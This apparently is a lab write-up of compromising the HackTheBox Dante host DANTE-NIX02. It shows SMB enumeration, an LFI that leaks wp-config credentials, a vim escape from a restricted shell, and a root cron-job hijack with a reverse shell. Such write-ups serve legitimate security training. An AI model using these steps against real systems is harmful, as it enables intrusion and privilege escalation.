# 172.16.1.10 - DANTE-NIX02 Pwn3d!

sudo nmap -sC -sV 172.16.1.10

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-29 10:02 CDT

Nmap scan report for 172.16.1.10

Host is up (0.020s latency).

Not shown: 996 closed tcp ports (reset)

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 3072 5a:9c:1b:a5:c1:7f:2d:4f:4b:e8:cc:7b:e4:47:bc:a9 (RSA)

| 256 fd:d6:3a:3f:a8:04:56:4c:e2:76:db:85:91:0c:5e:42 (ECDSA)

|_ 256 e2:d5:17:7c:58:75:26:5b:e1:1b:98:39:3b:2c:6c:fc (ED25519)

80/tcp open http Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Dante Hosting

|_http-server-header: Apache/2.4.41 (Ubuntu)

139/tcp open netbios-ssn Samba smbd 4.6.2

445/tcp open netbios-ssn Samba smbd 4.6.2

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:

|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

| smb2-time:

| date: 2026-03-29T15:02:27

|_ start_date: N/A

|_clock-skew: -8s

| smb2-security-mode:

| 3:1:1:

|_ Message signing enabled but not required

crackmapexec smb 172.16.1.10 -u ‘hello’ -p ‘wefaw’

SMB 172.16.1.10 445 DANTE-NIX02 [*] Windows 6.1 Build 0 (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False)

SMB 172.16.1.10 445 DANTE-NIX02 [+] \hello:wefaw

┌─[root@htb-wu2o6qke0g]─[/home/ronking37]

└──╼ #crackmapexec smb 172.16.1.10 -u ‘hello’ -p ‘wefaw’ --shares

SMB 172.16.1.10 445 DANTE-NIX02 [*] Windows 6.1 Build 0 (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False)

SMB 172.16.1.10 445 DANTE-NIX02 [+] \hello:wefaw

SMB 172.16.1.10 445 DANTE-NIX02 [*] Enumerated shares

SMB 172.16.1.10 445 DANTE-NIX02 Share Permissions Remark

SMB 172.16.1.10 445 DANTE-NIX02 -—- -———- -—–

SMB 172.16.1.10 445 DANTE-NIX02 print$ Printer Drivers

SMB 172.16.1.10 445 DANTE-NIX02 SlackMigration READ

SMB 172.16.1.10 445 DANTE-NIX02 IPC$ IPC Service (DANTE-NIX02 server (Samba, Ubuntu))

┌─[root@htb-wu2o6qke0g]─[/home/ronking37]

└──╼ #smbclient \\\\172.16.1.10\\SlackMigration

Password for [WORKGROUP\root]:

Try “help” to get a list of possible commands.

smb: \> ls

. D 0 Mon Apr 12 09:39:41 2021

.. D 0 Thu Aug 25 15:43:55 2022

admintasks.txt N 279 Mon May 18 10:24:22 2020

```
    13758504 blocks of size 1024\. 1582136 blocks available
```

smb: \> get admintasks.txt

getting file \admintasks.txt of size 279 as admintasks.txt (7.0 KiloBytes/sec) (average 7.0 KiloBytes/sec)

smb: \> exit

┌─[root@htb-wu2o6qke0g]─[/home/ronking37]

└──╼ #cat admintasks.txt

-Remove wordpress install from web root - PENDING

-Reinstate Slack integration on Ubuntu machine - PENDING

-Remove old employee accounts - COMPLETE

-Inform Margaret of the new changes - COMPLETE

-Remove account restrictions on Margarets account post-promotion to admin - PENDING

Remember todo.txt? It told us that there is an LFI vulnerability in “the other site”

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-UcHu.png)

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-HF_.png)

After intercepting a request, we see that the page parameter is being used. Lets send to repeater

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-gZd.png)

We can see the contents of /etc/passwd

Tried to get ssh keys but was unsuccessful

We see users frank and margaret at the bottom of /etc/passwd file

We search margaret’s home directory for a flag

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-fLaJ.png)

We try a different method to see if we can uncover config files

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-_.png)

Echo -n ’<base64 text> | base64 -d

<?php

/**

* The base configuration for WordPress

*

* The wp-config.php creation script uses this file during the

* installation. You don’t have to use the web site, you can

* copy this file to “wp-config.php” and fill in the values.

*

* This file contains the following configurations:

*

* * MySQL settings

* * Secret keys

* * Database table prefix

* * ABSPATH

*

* @link https://wordpress.org/support/article/editing-wp-config-php/

*

* @package WordPress

*/

// ** MySQL settings - You can get this info from your web host ** //

/** The name of the database for WordPress */

define( ‘DB_NAME’ ‘wordpress’ );

/** MySQL database username */

define( ‘DB_USER’, ‘margaret’ );

/** MySQL database password */

define( ‘DB_PASSWORD’, ‘Welcome1!2@3#’ );

/** MySQL hostname */

define( ‘DB_HOST’, ‘localhost’ );

/** Database Charset to use in creating database tables. */

define( ‘DB_CHARSET’, ‘utf8’ );

/** The Database Collate type. Don’t change this if in doubt. */

define( ‘DB_COLLATE’, ’’ );

/**#@+

* Authentication Unique Keys and Salts.

*

* Change these to different unique phrases!

* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}

* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.

*

* @since 2.6.0

*/

define( ‘AUTH_KEY’, ‘put your unique phrase here’ );

define( ‘SECURE_AUTH_KEY’, ‘put your unique phrase here’ );

define( ‘LOGGED_IN_KEY’, ‘put your unique phrase here’ );

define( ‘NONCE_KEY’, ‘put your unique phrase here’ );

define( ‘AUTH_SALT’, ‘put your unique phrase here’ );

define( ‘SECURE_AUTH_SALT’, ‘put your unique phrase here’ );

define( ‘LOGGED_IN_SALT’, ‘put your unique phrase here’ );

define( ‘NONCE_SALT’, ‘put your unique phrase here’ );

/**#@-*/

/**

* WordPress Database Table prefix.

*

* You can have multiple installations in one database if you give each

* a unique prefix. Only numbers, letters, and underscores please!

*/

$table_prefix = ‘wp_’;

/**

* For developers: WordPress debugging mode.

*

* Change this to true to enable the display of notices during development.

* It is strongly recommended that plugin and theme developers use WP_DEBUG

* in their development environments.

*

* For information on other constants that can be used for debugging,

* visit the documentation.

*

* @link https://wordpress.org/support/article/debugging-in-wordpress/

*/

define( ‘WP_DEBUG’, false );

/* That’s all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */

if ( ! defined( ‘ABSPATH’ ) ) {

define( ‘ABSPATH’, __DIR__ . ‘/’ );

}

/** Sets up WordPress vars and included files. */

require_once ABSPATH . ‘wp-settings.php’;

margaret:Welcome1!2@3#

ssh margaret@172.16.1.10

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-ht_o.png)

We are in a restricted shell. To escape this, open vim

Then use the vim command interface to run these commands in succession

:set shell=/bin/bash

:shell

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-wGba.png)

We’ve escaped the limited shell . We can read the flag we discovered earlier

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-KnMc.png)

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-cD.png)

After carefully enumerating margaret’s home directory, we find an interesting file

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-AKn.png)

We see Frank’s password in cleartext

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-vC.png)

frank:TractorHeadtorchDeskmat

su frank

We use a tool called pspy to find a cronjob running as root targeting a file in franks home directory

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-Hte.png)

The target file is apache_restart.py

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-zHx.png)

We rename the file to 1 so we can save our reverse shell with the name of apache_restart.py

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-RaC.png)

We spawn another shell on the web application server and set up our nc listener

![](172%2016%201%2010%20-%20DANTE-NIX02%20Pwn3d%21/imported-image-PNmX.png)

We get the root shell

No pivot